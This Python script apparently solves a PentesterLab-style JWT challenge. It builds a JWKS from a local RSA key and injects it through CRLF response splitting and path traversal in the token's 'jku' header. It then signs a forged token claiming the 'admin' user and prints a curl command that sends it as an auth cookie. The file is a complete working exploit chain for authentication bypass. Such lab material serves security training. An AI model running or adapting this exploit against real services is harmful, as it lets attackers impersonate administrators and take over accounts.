import base64
import json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from urllib.parse import quote


headers = {
    "typ": "JWT",
    "alg": "RS256",
    "jku": "http://xxxxxxx/.well-known//jwks.json"
}

payload = {
  "user": "admin"
}

#openssl genrsa -out private.pem 2048
with open('C:/Users/User/Documents/git/Python_scripts/JWT/private.pem', 'rb') as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None,  
        backend=default_backend()
    )

public_key = private_key.public_key()

n = public_key.public_numbers().n
e = public_key.public_numbers().e

n_b64 = base64.urlsafe_b64encode(n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('=').replace('+', '')
e_b64 = base64.urlsafe_b64encode(e.to_bytes((e.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('=').replace('+', '')

jwks = {
    "keys":[{
        "kty":"RSA",
        "use":"sig",
        "kid":"pentesterlab",
        "n":n_b64,
        "e":e_b64,
        "alg":"RS256"}]
    }

jwk = json.dumps(jwks)
len = len(jwk)
print(str(len))
url = "http://xxxxxxx/.well-known/../debug?value=1337%0D%0AContent-Length:"+str(len)+"%0D%0A%0D%0A"+quote(jwk.replace(' ', ''), safe=':,"')

#print("curl --dump-header - \""+ url + "\"")

headers["jku"] = url
payload = json.dumps(payload)
headers = json.dumps(headers)
payload = base64.urlsafe_b64encode(payload.encode('utf-8')).decode('utf-8').rstrip('=')
headers = base64.urlsafe_b64encode(headers.encode('utf-8')).decode('utf-8').rstrip('=')


hash_algorithm = hashes.SHA256()
signature = private_key.sign((headers+"."+payload).encode('utf-8'),padding.PKCS1v15(),hash_algorithm)
jwt = headers+"."+payload+"."+base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
print("curl --dump-header - -H 'Cookie: auth="+jwt+"' http://xxxxxxx/")
